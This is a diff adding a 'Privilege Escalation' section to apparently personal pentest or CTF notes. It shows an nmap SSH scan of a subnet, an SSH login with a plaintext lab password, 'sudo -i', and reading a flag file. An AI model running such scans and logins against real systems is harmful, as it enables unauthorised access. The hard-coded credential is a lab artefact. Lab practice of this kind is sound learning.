@@ -695,3 +695,20 @@ Find the version of Bind used
 	https://packetpushers.net/blog/turning-bind-dns-management-into-a-walk-in-the-park/
 ```
 
+#Privilege Escalation
+```
+nmap -sV -p 22 192.168.0.1/24
+
+find ssh open
+
+ssh kali@192.168.0.100
+passwd: 123@123
+
+sudo -i
+cd /
+find . -name imroot.txt
+cat /home/kali/Desktop/imroot.txt
+	-> root23423
+
+```
+
